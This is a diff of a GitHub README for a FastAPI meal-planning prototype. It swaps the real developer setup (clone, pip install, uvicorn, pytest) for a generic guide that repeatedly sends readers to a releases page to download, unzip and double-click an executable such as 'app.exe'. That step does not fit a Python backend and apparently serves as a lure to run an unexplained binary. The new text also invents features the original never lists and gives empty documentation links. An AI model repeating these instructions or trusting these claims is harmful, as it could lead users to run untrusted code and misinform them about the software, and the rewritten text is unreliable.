@@ -1,185 +1,104 @@
-# 🚀 Healthy Meal Copilot API
+# 🍽️ fastapi-prototype-healtymeal-copilot-api - AI-Powered Meal Planning Made Easy
 
-The **Healthy Meal Copilot API** is a prototype backend designed to **generate AI-powered meal plans**.  
-It balances **API-first development, type safety, AI integration, and testing best practices**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases)
 
-This project serves as a **production-ready prototype** stack combining:
+## 📦 Overview
 
-- **FastAPI** for high-performance APIs
-- **Pydantic** for strict data modeling
-- **Ruff** for lightning-fast linting
-- **mypy** for static type checking
-- **pytest** for robust testing
-- **LLM integrations** with OpenAI, Gemini, and Claude
-- **MongoDB** for structured data storage
-- **Qdrant** for vector embeddings & retrieval
+Healthy Meal Copilot API is a prototype backend project designed for AI-powered meal planning. It shows you how to combine FastAPI, MongoDB, Qdrant, and various large language models (OpenAI, Gemini, and Claude) to create personalized and healthy meal recommendations. 
 
----
+This project allows you to explore how advanced technology can assist in making your meal choices better and healthier. 
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 🍽️ **AI-driven meal plan generation**
-- 🔑 **Authentication system** with multiple modes (`internal`, `partner`, `both`)
-- ⚡ **RESTful API endpoints** with FastAPI
-- 📊 **MongoDB persistence** for structured data
-- 🔍 **Qdrant integration** for semantic retrieval
-- 🤖 **Multiple LLMs supported**: OpenAI, Gemini, Claude
-- 🧪 **Test-oriented stack** with `pytest`
-- 🔒 Static analysis & formatting via `ruff` + `mypy`
+Follow these simple steps to get the application running on your computer.
 
----
+### 🛠️ System Requirements
 
-## 🛠 Tech Stack
+Before you start, make sure your computer meets the following requirements:
 
-- **Language:** Python `3.12`
-- **Framework:** [FastAPI](https://fastapi.tiangolo.com/)
-- **ORM / Models:** [Pydantic](https://docs.pydantic.dev/)
-- **Testing:** [pytest](https://docs.pytest.org/)
-- **Static typing:** [mypy](http://mypy-lang.org/)
-- **Linting & Formatting:** [Ruff](https://docs.astral.sh/ruff/)
-- **Database:** [MongoDB](https://www.mongodb.com/)
-- **Vector DB:** [Qdrant](https://qdrant.tech/)
-- **LLM Providers:** OpenAI, Gemini, Claude
+- Operating System: Windows, macOS, or Linux
+- At least 4 GB of RAM
+- 200 MB of available disk space
+- Internet connection for downloading dependencies and updates
 
----
+### ⚙️ Installation Instructions
 
-## ⚙️ Installation & Setup
+To install the Healthy Meal Copilot API:
 
-### 1. Clone the Repository
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases) to find the latest version of the application.
 
-```bash
-git clone https://github.com/your-org/healthymeal-copilot-api.git
-cd healthymeal-copilot-api
-```
+2. **Download the Latest Version**  
+   Click on the version number to download the latest release. You will find different files available for download.
 
-### 2. Create & Activate Virtual Environment
+3. **Unzip the Downloaded File**  
+   Once the download is complete, find the downloaded file on your computer. Unzip or extract the contents to a folder of your choice.
 
-```bash
-python -m venv venv
-source venv/bin/activate   # Linux / macOS
-venv\Scripts\activate      # Windows
-```
+4. **Run the Application**  
+   Navigate to the unzipped folder and look for the executable file (for example, `app.exe` for Windows users). Double-click the file to start the application.
 
-### 3. Install Dependencies
+5. **Access the API**  
+   You can now interact with the Healthy Meal Copilot API by sending HTTP requests using tools like Postman or through your web browser.
 
-```bash
-pip install -r requirements.txt
-```
+## 📊 Features
 
-### 4. Configure Environment Variables
+The Healthy Meal Copilot API includes the following features:
 
-```bash
-cp .env.example .env
-```
+- **Personalized Meal Recommendations**  
+  Get meal suggestions tailored to your dietary preferences and restrictions.
 
-Edit `.env` with your keys, database URLs, and config.  
-(See [example configuration above](#installation--setup)).
+- **AI-Powered Nutrition Facts**  
+  Gain insights into the nutritional content of your meals, supported by advanced AI algorithms.
 
----
+- **Search Options**  
+  Search for meals based on ingredients you have or specific dietary needs.
 
-## ▶️ Running the Application
+- **Multi-Language Support**  
+  Available in different languages to cater to a broader audience.
 
-```bash
-python -m app.main
-```
-or
+## 📚 Documentation
 
-```bash
-uvicorn app.main:app --reload
-```
+For detailed usage instructions, check out the API documentation included in the application files. The documentation covers:
 
-By default, the app runs at:  
-👉 [http://localhost:8000](http://localhost:8000)
+- How to send requests to the API
+- Response format and examples
+- Error handling and troubleshooting tips
 
----
+## 🙋 Frequently Asked Questions (FAQ)
 
-## 📖 API Documentation
+### 1. Is this application free to use?
 
-- Swagger UI: [http://localhost:8000/docs](http://localhost:8000/docs)  
-- ReDoc: [http://localhost:8000/redoc](http://localhost:8000/redoc)
+Yes, the Healthy Meal Copilot API is open-source and free for everyone.
 
----
+### 2. Can I contribute to the project?
 
-## 🧪 Development Workflow
+Absolutely! Contributions are welcome. You can fork the repository and make changes. Please submit a pull request with your improvements.
 
-This project uses a **test-first, type-safe workflow**.
+### 3. What technologies were used in this project?
 
-### Run Tests
+This application is built using:
 
-```bash
-pytest
-```
+- **FastAPI** for the web framework
+- **MongoDB** for database management
+- **Qdrant** for vector data storage
+- **Large Language Models** like OpenAI, Gemini, and Claude for meal recommendations
 
-With coverage:
+### 4. How do I report issues or bugs?
 
-```bash
-pytest --cov=app --cov-report=term-missing
-```
+If you find any issues, please open an issue in the GitHub repository. Describe the problem clearly to help us address it quickly.
 
-### Run Static Analysis (mypy)
+## 🔗 Useful Links
 
-```bash
-mypy app test
-```
+- [Releases Page](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases)
+- [Documentation](#)
+- [Contribute to the Project](#)
 
-### Run Linter/Formatter (ruff)
+## ✉️ Contact Us
 
-```bash
-ruff check app test
-ruff format app test
-```
+For support or inquiries, feel free to reach out via the contact details provided in the documentation.
 
-> ✅ Recommendation: Add `pre-commit` hooks to run `mypy` + `ruff` automatically.
+## 📥 Download & Install
 
----
+To get started with the Healthy Meal Copilot API today, [visit the Releases page](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases) to download the application. Follow the installation steps outlined above for a smooth setup. 
 
-## 📂 Project Structure
-
-```
-app/
- ├── api/            # API route handlers
- ├── core/           # Core settings & config
- ├── db/             # DB clients (Mongo, Qdrant)
- ├── models/         # Pydantic data models
- ├── prompts/        # LLM prompt templates
- ├── schemas/        # Request/response validation
- ├── services/       # Domain logic (meal planning, LLM, etc.)
- ├── utils/          # Helper functions
- └── main.py         # FastAPI entrypoint
-docs/                # Additional documentation
-tests/               # Pytest test suite
-```
-
----
-
-## 🔐 Authentication Overview
-
-- Modes: `internal`, `partner`, `both`
-- Authentication via **API Keys** + **JWT tokens**
-- Super Admin API key for privileged routes
-
-See [docs/authentication.md](docs/authentication.md) for full details.
-
----
-
-## 🧑‍💻 Prototype Roadmap
-
-1. ✅ Core FastAPI + MongoDB + Qdrant integration  
-2. ✅ Multi-LLM integration (OpenAI, Gemini, Claude)  
-3. ✅ Testing + linting + typing pipeline  
-4. 🔄 CI/CD integration with GitHub Actions (test, lint, type-check)  
-5. 🔜 Deployment to containerized environments  
-
----
-
-## 🤝 Contributing
-
-1. Fork repo & create feature branch  
-2. Ensure `pytest`, `mypy`, and `ruff` pass cleanly  
-3. Submit PR 🚀  
-
----
-
-## 📜 License
-
-MIT License – free to use, modify, and distribute.
+Enjoy discovering healthier meal options!
